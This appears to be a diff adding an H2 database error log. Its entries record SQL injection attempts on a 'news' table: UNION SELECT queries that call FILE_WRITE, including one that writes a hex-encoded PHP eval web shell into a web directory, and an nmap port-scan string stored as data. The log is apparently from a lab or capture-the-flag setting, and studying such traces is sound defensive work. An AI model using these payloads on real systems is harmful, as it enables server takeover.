+	at org.h2.command.dml.Query.query(Query.java:341)
+	at org.h2.command.dml.Query.query(Query.java:309)
+	at org.h2.command.dml.SelectUnion.queryWithoutCache(SelectUnion.java:209)
+	at org.h2.command.dml.SelectUnion.query(SelectUnion.java:440)
+	at org.h2.command.dml.Query.query(Query.java:309)
+	at org.h2.command.dml.Query.query(Query.java:36)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:110)
+	at org.h2.command.Command.executeQuery(Command.java:201)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:179)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:158)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:392)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:90)
+	at java.lang.Thread.run(Thread.java:745)
+2016-05-03 11:10:56 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_WRITE('xx', '/tmp/xxxx'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,FILE_WRITE('xx', '/tmp/xxxx'),null [42000-191]
+2016-05-03 11:11:07 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "nmap -sT -vv -p 1-65535 127.0.0.1"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 union select null,null,FILE_WRITE('61616161', '/tmp/xxxx'),null [22018-191]
+2016-05-03 11:11:07 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_WRITE('61616161', '/tmp/xxxx'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,FILE_WRITE('61616161', '/tmp/xxxx'),null [42000-191]
+2016-05-03 11:13:23 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "nmap -sT -vv -p 1-65535 127.0.0.1"; SQL statement:
+SELECT * FROM news WHERE id='1~~~~~~~~' or 1=1 union select null,null,FILE_WRITE('3c3f706870206576616c28245f504f53545b636363635d293b3f3e', '/www/write_shell_here_=P/.a.php'),null [22018-191]
+2016-05-03 11:13:23 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "UPDATE NEWS SET HITS=HITS+1 WHERE ID='1~~~~~~~~' OR 1=1 UNION[*] SELECT NULL,NULL,FILE_WRITE('3c3f706870206576616c28245f504f53545b636363635d293b3f3e', '/www/write_shell_here_=P/.a.php'),NULL "; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1~~~~~~~~' or 1=1 union select null,null,FILE_WRITE('3c3f706870206576616c28245f504f53545b636363635d293b3f3e', '/www/write_shell_here_=P/.a.php'),null [42000-191]
+2016-05-03 11:22:39 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1"""; SQL statement:
+SELECT * FROM news WHERE id='1"' [22018-191]
+2016-05-03 11:22:39 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "1"""; SQL statement:
+UPDATE news SET hits=hits+1 WHERE id='1"' [22018-191]
